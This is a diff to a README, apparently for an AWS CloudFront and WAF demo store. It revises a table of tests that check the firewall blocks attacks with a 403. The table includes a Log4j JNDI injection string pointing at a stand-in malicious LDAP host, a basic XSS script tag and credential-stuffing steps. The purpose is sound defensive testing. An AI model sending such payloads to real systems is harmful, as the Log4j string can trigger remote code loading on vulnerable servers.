@@ -44,10 +44,7 @@ fields @timestamp, @message
 | Test scenario  | Threat category  | How to test | 
 |:------------- |:--------------- | :-------------|
 | Exploit Log4j CVE | **Vulnerability exploit** | Load the following page with malicious payload, and verify that the request is blocked with 403 error code: <br/>  ```https://xxxxxxxx.cloudfront.net/product/${jndi:ldap://malicious.domain.com/}``` |
-| Exploit Log4j CVE | **Cross Site Scripting XSS** | Load the following page with malicious payload, and verify that the request is blocked with 403 error code: <br/>  ```https://xxxxxxxx.cloudfront.net/product/${jndi:ldap://malicious.domain.com/}``` |
-
-| **Application vulnerability exploit** | OWASP TBD | ```product/<script><alert>Hello></alert></script>``` or in registration form, and log4j ```${jndi:ldap://example.com/}``` |
-| **Application vulnerability exploit** | OWASP TBD | ```product/<script><alert>Hello></alert></script>``` or in registration form, and log4j ```${jndi:ldap://example.com/}``` |
+| Post malicious XSS payload | **Cross Site Scripting** | Login in (usr: Joud, pwd: demo), then load any product page to post the following comment with an XSS payload, and verify that the request is blocked with 403 error code: <br/> ```<script><alert>Hello></alert></script>``` |
 
 | Threat category  | Test scenario  | How to test | 
 |:------------- |:--------------- | :-------------|
@@ -63,6 +60,8 @@ fields @timestamp, @message
 | **Credential Stuffing** | Stolen credential detection | Use the following test _stolen credentials_ and verify that the api returns 403 block  <br/> ```WAF_TEST_CREDENTIAL@wafexample.com``` <br/> ```WAF_TEST_CREDENTIAL_PASSWORD``` |
 | **Credential Stuffing** | Password traversal detection | Using the same username, e.g. joe, login with different passwords 10-20 times until the api call returns 403 |
 | **Fake Account Creation** | Use a session to create many accounts | Try to create multiple acounts, and verify a 405 block after a few successful attempts |
+
+Navigate to scripts folder using the ```cd scripts``` command, then go through the different testing scenarios, 
 
 
 # Content delivery scenarios
@@ -128,4 +127,5 @@ remove the hierarchy in the aws-backend-config.json file
 * Generate intial data using GenAI
 * GenAI search bar
 * output aws config file in store-app folder automatically for troubleshooting
+* protect comment api
 
